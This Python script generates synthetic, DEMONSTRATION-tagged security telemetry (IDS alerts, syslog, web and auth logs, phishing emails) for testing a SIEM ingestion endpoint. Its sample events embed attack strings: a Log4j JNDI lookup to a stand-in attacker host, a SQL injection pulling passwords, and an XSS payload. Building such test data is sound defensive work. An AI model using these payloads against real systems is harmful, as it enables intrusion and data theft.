#!/usr/bin/env python3
"""Synthetic Real-Time Security Telemetry Event Generator.

================================================================================
CRITICAL NOTICE & COMPLIANCE:
All events produced by this generator are strictly synthetic simulation data.
Every event generated is unambiguously stamped with:
    environment = "DEMONSTRATION"
    synthetic = True
Never present or interpret these events as real-world production telemetry.
================================================================================
"""

import argparse
import asyncio
import json
import random
import sys
import time
from datetime import UTC, datetime
from typing import Any

import httpx

# Predefined Synthetic Threat Scenarios (ALL TAGGED AS DEMONSTRATION)
DEMO_ENVIRONMENT_TAG = "DEMONSTRATION"

DEMO_USERS = ["admin", "jsmith", "bwayne", "ckent", "dprince", "service_backup", "finance_user", "root"]
DEMO_HOSTNAMES = ["soc-workstation-01", "dc-primary.corp", "web-prod-02", "db-cluster-01", "mail-gateway.corp"]
DEMO_INTERNAL_IPS = ["10.0.1.50", "10.0.1.51", "10.0.2.100", "192.168.1.15", "192.168.1.25", "172.16.0.45"]
DEMO_EXTERNAL_IPS = ["198.51.100.12", "203.0.113.88", "192.0.2.77", "185.220.101.5", "45.154.255.99"]
DEMO_SURICATA_SIGNATURES = [
    ("ET EXPLOIT Possible Apache Log4j RCE (CVE-2021-44228)", "Attempted Administrator Privilege Gain", 1, "drop"),
    ("ET SCAN Nmap Scripting Engine User-Agent Detected", "Web Application Activity", 3, "alert"),
    ("ET MALWARE Cobalt Strike Beacon Malleable C2 Traffic", "A Network Trojan was detected", 1, "drop"),
    ("ET WEB_SERVER Possible SQL Injection Attempt in URI", "Web Application Attack", 2, "alert"),
    ("ET POLICY Suspicious Inbound SMB Traffic", "Potential Corporate Privacy Violation", 3, "alert"),
]


def generate_suricata_event() -> dict[str, Any]:
    """Generate synthetic Suricata EVE JSON event."""
    sig, cat, sev, action = random.choice(DEMO_SURICATA_SIGNATURES)
    now_iso = datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%S.%f+0000")
    src_ip = random.choice(DEMO_EXTERNAL_IPS)
    dest_ip = random.choice(DEMO_INTERNAL_IPS)
    src_port = random.randint(1024, 65535)
    dest_port = random.choice([80, 443, 8080, 22, 445, 3389])

    return {
        "timestamp": now_iso,
        "flow_id": random.randint(1000000000, 9999999999),
        "in_iface": "eth0",
        "event_type": "alert",
        "src_ip": src_ip,
        "src_port": src_port,
        "dest_ip": dest_ip,
        "dest_port": dest_port,
        "proto": "TCP",
        "alert": {
            "action": action,
            "gid": 1,
            "signature_id": random.randint(2000000, 2999999),
            "rev": 1,
            "signature": f"[DEMO] {sig}",
            "category": cat,
            "severity": sev,
        },
        "app_proto": "http",
        "http": {
            "hostname": "portal.demo.local",
            "url": "/api/v1/search?q=${jndi:ldap://demo.attacker.local/payload}",
            "http_method": "GET",
        },
        "community_id": f"1:demo_{random.randint(1000, 9999)}",
        "environment": DEMO_ENVIRONMENT_TAG,
        "synthetic": True,
    }


def generate_syslog_event() -> str:
    """Generate synthetic RFC 3164 Syslog security event line."""
    now_str = datetime.now(UTC).strftime("%b %d %H:%M:%S")
    hostname = random.choice(DEMO_HOSTNAMES)
    scenario = random.choice(["sshd_fail", "sshd_ok", "sudo_exec", "ufw_block"])
    src_ip = random.choice(DEMO_EXTERNAL_IPS)
    user = random.choice(DEMO_USERS)

    if scenario == "sshd_fail":
        return f"<85>{now_str} {hostname} sshd[{random.randint(1000, 9999)}]: Failed password for invalid user {user} from {src_ip} port {random.randint(1024, 65535)} ssh2 [environment={DEMO_ENVIRONMENT_TAG}]"
    elif scenario == "sshd_ok":
        return f"<86>{now_str} {hostname} sshd[{random.randint(1000, 9999)}]: Accepted publickey for {user} from {src_ip} port {random.randint(1024, 65535)} ssh2 [environment={DEMO_ENVIRONMENT_TAG}]"
    elif scenario == "sudo_exec":
        return f"<85>{now_str} {hostname} sudo: pam_unix(sudo:session): session opened for user root by {user}(uid=1000) [environment={DEMO_ENVIRONMENT_TAG}]"
    else:
        dest_ip = random.choice(DEMO_INTERNAL_IPS)
        return f"<4>{now_str} {hostname} kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC={src_ip} DST={dest_ip} LEN=60 PROTO=TCP SPT={random.randint(1024, 65535)} DPT=22 [environment={DEMO_ENVIRONMENT_TAG}]"


def generate_json_event() -> dict[str, Any]:
    """Generate generic structured JSON security event."""
    return {
        "timestamp": datetime.now(UTC).isoformat(),
        "source": "cloud_siem_feed",
        "source_type": "generic_json",
        "event_type": random.choice(["api_key_created", "bucket_permission_modified", "security_group_ingress_added"]),
        "severity": random.choice(["low", "medium", "high"]),
        "source_ip": random.choice(DEMO_EXTERNAL_IPS),
        "destination_ip": random.choice(DEMO_INTERNAL_IPS),
        "username": random.choice(DEMO_USERS),
        "hostname": random.choice(DEMO_HOSTNAMES),
        "action": random.choice(["allowed", "denied", "flagged"]),
        "status": "success",
        "environment": DEMO_ENVIRONMENT_TAG,
        "synthetic": True,
        "details": {
            "demo_scenario": "Cloud Infrastructure Modification",
            "cloud_provider": "AWS_SIMULATED",
        },
    }


def generate_application_event() -> str:
    """Generate synthetic Nginx/Apache Combined Access Log line."""
    client_ip = random.choice(DEMO_EXTERNAL_IPS)
    user = random.choice(["-", "admin", "guest"])
    now_str = datetime.now(UTC).strftime("%d/%b/%Y:%H:%M:%S +0000")
    method = random.choice(["GET", "POST", "PUT"])
    uri = random.choice([
        "/index.html",
        "/api/v1/auth/login",
        "/admin/config?id=1' UNION SELECT username,password FROM users--",
        "/static/js/app.js",
        "/search?q=<script>alert('XSS')</script>",
    ])
    status_code = random.choice([200, 200, 302, 401, 403, 404, 500])
    bytes_sent = random.randint(200, 15000)
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) DemoSecurityScanner/1.0"

    return f'{client_ip} - {user} [{now_str}] "{method} {uri} HTTP/1.1" {status_code} {bytes_sent} "https://demo.local" "{user_agent}" [environment={DEMO_ENVIRONMENT_TAG}]'


def generate_authentication_event() -> dict[str, Any]:
    """Generate synthetic Windows Event Log / Authentication event."""
    is_failure = random.random() < 0.4
    event_id = 4625 if is_failure else 4624
    user = random.choice(DEMO_USERS)

    return {
        "TimeCreated": datetime.now(UTC).isoformat(),
        "EventID": event_id,
        "source": "windows_security",
        "source_type": "authentication",
        "TargetUserName": user,
        "TargetDomainName": "CORP_DEMO",
        "WorkstationName": random.choice(DEMO_HOSTNAMES),
        "IpAddress": random.choice(DEMO_EXTERNAL_IPS),
        "IpPort": random.randint(1024, 65535),
        "LogonType": random.choice(["2", "3", "10"]),
        "Status": "0xC000006D" if is_failure else "0x0",
        "FailureReason": "Unknown user name or bad password." if is_failure else None,
        "environment": DEMO_ENVIRONMENT_TAG,
        "synthetic": True,
    }


def generate_email_event() -> dict[str, Any]:
    """Generate synthetic Email Security Gateway / Phishing event."""
    is_phishing = random.random() < 0.5
    sender_domain = random.choice(["legit-vendor.com", "secure-bank-update.xyz", "payroll-service-portal.info"])
    sender = f"billing@{sender_domain}"
    recipient = f"{random.choice(DEMO_USERS)}@corp-demo.local"

    spf = "fail" if is_phishing else "pass"
    dkim = "fail" if is_phishing else "pass"
    dmarc = "reject" if is_phishing else "pass"
    phishing_score = round(random.uniform(0.75, 0.99), 2) if is_phishing else round(random.uniform(0.01, 0.20), 2)

    return {
        "timestamp": datetime.now(UTC).isoformat(),
        "source": "proofpoint_simulated",
        "source_type": "email",
        "sender": sender,
        "recipient": recipient,
        "subject": "[DEMO URGENT] Immediate Password Verification Required" if is_phishing else "Monthly Invoicing Update",
        "client_ip": random.choice(DEMO_EXTERNAL_IPS),
        "spf_result": spf,
        "dkim_result": dkim,
        "dmarc_result": dmarc,
        "phishing_score": phishing_score,
        "threat_verdict": "phishing" if is_phishing else "clean",
        "extracted_urls": ["http://phish-login-credential-harvester.xyz/login"] if is_phishing else ["https://legit-vendor.com/invoice"],
        "attachment_hashes": ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"] if is_phishing else [],
        "environment": DEMO_ENVIRONMENT_TAG,
        "synthetic": True,
    }


def generate_event(source_type: str) -> tuple[Any, str]:
    """Generate a synthetic event for the requested source type."""
    st = source_type.lower()
    if st == "suricata":
        return generate_suricata_event(), "suricata"
    elif st == "syslog":
        return generate_syslog_event(), "syslog"
    elif st == "json":
        return generate_json_event(), "json"
    elif st == "application" or st == "app":
        return generate_application_event(), "application"
    elif st == "authentication" or st == "auth":
        return generate_authentication_event(), "authentication"
    elif st == "email":
        return generate_email_event(), "email"
    else:
        # Pick random
        choice = random.choice(["suricata", "syslog", "json", "application", "authentication", "email"])
        return generate_event(choice)


async def run_generator(args: argparse.Namespace) -> None:
    """Execute synthetic telemetry event generator loop."""
    print("=" * 80)
    print(" REAL-TIME SECURITY TELEMETRY GENERATOR")
    print(f" ENVIRONMENT: {DEMO_ENVIRONMENT_TAG} (SYNTHETIC SIMULATION DATA ONLY)")
    print("=" * 80)
    print(f" Source:      {args.source}")
    print(f" Target Mode: {args.target}")
    print(f" Target URL:  {args.endpoint if args.target == 'http' else 'N/A'}")
    print(f" Target EPS:  {args.rate} events/sec")
    print(f" Total Limit: {args.count if args.count > 0 else 'Unlimited'} events")
    print(f" Duration:    {args.duration if args.duration > 0 else 'Continuous'} seconds")
    print("=" * 80)

    start_time = time.time()
    events_sent = 0
    events_failed = 0
    interval = 1.0 / max(args.rate, 1)

    client = httpx.AsyncClient(timeout=10.0) if args.target == "http" else None

    try:
        while True:
            # Check duration constraint
            if args.duration > 0 and (time.time() - start_time) >= args.duration:
                break
            # Check count constraint
            if args.count > 0 and events_sent >= args.count:
                break

            loop_start = time.perf_counter()

            # Decide if injecting an intentional malformed event
            if args.invalid_ratio > 0 and random.random() < args.invalid_ratio:
                payload = {"corrupted_telemetry": True, "malformed_field": None, "environment": DEMO_ENVIRONMENT_TAG}
                source_type = "unknown_corrupted"
            else:
                payload, source_type = generate_event(args.source)

            # Route payload
            if args.target == "stdout":
                if isinstance(payload, dict):
                    print(json.dumps(payload, indent=2))
                else:
                    print(payload)
                events_sent += 1
            elif args.target == "http" and client is not None:
                try:
                    params = {"source_type": source_type} if source_type != "unknown_corrupted" else None
                    if isinstance(payload, (dict, list)):
                        resp = await client.post(
                            args.endpoint,
                            json=payload,
                            params=params,
                            headers={"Content-Type": "application/json"},
                        )
                    else:
                        resp = await client.post(
                            args.endpoint,
                            content=str(payload),
                            params=params,
                            headers={"Content-Type": "text/plain"},
                        )
                    if resp.status_code in (200, 202):
                        events_sent += 1
                    else:
                        events_failed += 1
                except Exception as req_exc:
                    events_failed += 1
                    if events_failed <= 3:
                        print(f"[!] HTTP POST to {args.endpoint} failed: {req_exc}", file=sys.stderr)

            # Rate throttling
            elapsed = time.perf_counter() - loop_start
            sleep_time = interval - elapsed
            if sleep_time > 0:
                await asyncio.sleep(sleep_time)

            # Periodic progress output
            if events_sent > 0 and events_sent % max(int(args.rate * 2), 10) == 0:
                cur_duration = max(time.time() - start_time, 0.001)
                cur_eps = events_sent / cur_duration
                print(f"[DEMO STREAM] Sent: {events_sent} | Failed: {events_failed} | Actual EPS: {cur_eps:.1f}")

    except KeyboardInterrupt:
        print("\n[*] Generator interrupted by user.")
    finally:
        if client:
            await client.aclose()

    total_time = max(time.time() - start_time, 0.001)
    final_eps = events_sent / total_time
    print("=" * 80)
    print(" GENERATOR COMPLETED")
    print(f" Environment:   {DEMO_ENVIRONMENT_TAG}")
    print(f" Events Sent:   {events_sent}")
    print(f" Events Failed: {events_failed}")
    print(f" Total Time:    {total_time:.2f} seconds")
    print(f" Average Rate:  {final_eps:.1f} EPS")
    print("=" * 80)


def main() -> None:
    """CLI entry point for event generator."""
    parser = argparse.ArgumentParser(
        description="Synthetic Security Telemetry Generator (DEMONSTRATION ONLY)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--source",
        choices=["all", "suricata", "syslog", "json", "application", "authentication", "email"],
        default="all",
        help="Telemetry source type to generate",
    )
    parser.add_argument(
        "--rate",
        type=int,
        default=20,
        help="Target events per second (EPS)",
    )
    parser.add_argument(
        "--count",
        type=int,
        default=50,
        help="Total number of events to generate (0 for unlimited)",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=0,
        help="Duration in seconds to run (0 for infinite/until count)",
    )
    parser.add_argument(
        "--target",
        choices=["stdout", "http"],
        default="stdout",
        help="Output destination",
    )
    parser.add_argument(
        "--endpoint",
        type=str,
        default="http://localhost:8000/api/v1/telemetry/ingest",
        help="HTTP API endpoint URL for ingestion",
    )
    parser.add_argument(
        "--invalid-ratio",
        type=float,
        default=0.0,
        help="Ratio of invalid/corrupted events to inject for DLQ testing (0.0 - 1.0)",
    )

    args = parser.parse_args()
    asyncio.run(run_generator(args))


if __name__ == "__main__":
    main()
